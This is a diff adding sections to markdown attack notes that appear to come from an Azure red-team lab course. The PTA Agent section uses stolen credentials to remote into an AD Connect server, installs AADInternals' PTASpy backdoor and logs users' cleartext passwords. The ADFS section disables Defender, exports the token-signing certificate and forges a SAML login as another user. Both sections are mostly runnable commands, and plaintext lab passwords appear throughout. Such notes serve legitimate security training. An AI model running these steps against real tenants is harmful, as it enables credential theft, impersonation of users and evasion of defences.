@@ -23,6 +23,7 @@ Never ever use user Identity - use workload identities: Service Principals; Mana
   - [Insecure Storage Blob](https://github.com/conma293/Azure/blob/main/killcycle.md#storage-blob)
   - [Function App - Continuous Development CD/DC leveraging github](https://github.com/conma293/Azure/blob/main/killcycle.md#function-apps)
   - [Application Proxy](https://github.com/conma293/Azure/blob/main/killcycle.md#application-proxy)
+  - [ADFS]
 
 
 **REFS:**
@@ -1548,7 +1549,85 @@ Finally, use the onpremadmin user's credentials to access the defcorpsecure tena
 
 ## PTA Agent
 
+Recall that we extracted credentials for a user adconnectadmin from defreg-adminsrv by compromising it using privileges of Intune administrator. Going by the PowerShell history we extracted the credentials from, the user adconnectadmin may have administrative rights on defers-adcnct.
+
+
+Let's try to connect to defers-adcnct by using the credentials that we have. Assuming that we can resolve the name to an IP and it is reachable from the student VM: 
+$password = ConvertTo-SecureString 'UserIntendedToManageSyncWithCl0ud!' -AsPlainText -Force 
+$creds = New-Object System.Management.Automation.PSCredential('adconnectadmin', $password) 
+$adcnct = New-PSSession -ComputerName 172.16.2.36 -Credential $creds 
+Enter-PSSession $adcnct 
+
+Check if Azure AD connect is installed on defres-adcnct. 
+```
+Get-ADSyncConnector
+```
+
+Now install the Agent:
+```
+Import-Module C:\Users\adconnectadmin\Documents\AADInternals\AADInternals.psd1
+Install-AADIntPTASpy
+```
+
+Now, we can authenticate as any user that is synced from on-prem and we can also get passwords in clear-text for the users that authenticate with the correct password:
+```
+Get-AADIntPTASpyLog -DecodePasswords
+```
+
+
+
+
 ## SSO
 
 ## ADFS
 
+We compromised adfsadmin@deffin.com by compromising the deffin-approxy machine. Assuming that we know the IP of the AD FS server for deffin.com and the user actually has DA privileges (as many organizations setup ADFS role on the domain controller) try to access it using PSRemoting:
+```
+$password = ConvertTo-SecureString 'UserToCreateandManageF3deration!' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('adfsadmin', $password) 
+$adfs = New-PSSession -ComputerName 172.16.4.41 -Credential $creds 
+Enter-PSSession $adcnct
+```
+
+Copy AADInternals tool to the server and extract the token signing certificate: 
+```
+Set-MpPreference -DisableRealtimeMonitoring $true 
+exit
+...
+Copy-Item -ToSession $adfs -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adfsadmin\Documents
+Enter-PSSession $adfs
+Expand-Archive C:\Users\adfsadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\ Users\adfsadmin\Documents\AADInternals
+```
+
+Export the token signing certificate:
+```
+Export-AADIntADFSSigningCertificate
+```
+
+
+Get the ImmutableID of the user that we want to compromise. We can use Microsoft's ADModule for this. Run the below commands on the student VM: 
+```
+Import-Module C:\AzAD\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll 
+Import-Module C:\AzAD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1 
+[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser -Server 172.16.4.1 -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray()) v1pOC7Pz8kaT6JWtThJKRQ==
+```
+
+Use the token signing certificate with the ImmutableID of onpremuser that we want to compromise:
+```
+Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
+```
+
+Copy the temporay html to the student VM and open it to login as the onpremuser user:
+```
+ls C:\Users\adfsadmin\AppData\Local\Temp\*.tmp.html 
+exit
+...
+Copy-Item -FromSession $adfs -Path C:\Users\adfsadmin\AppData\Local\Temp\tmp9E0F.tmp.html -Destination C:\AzAD\Tools\
+```
+
+Open the html file with Chrome to access the deffin.com tenant.
+For the lab you can use the following credentials –
+```
+Username – onpremuser@deffin.com
+Password - NotIntheCl0ud!
+```
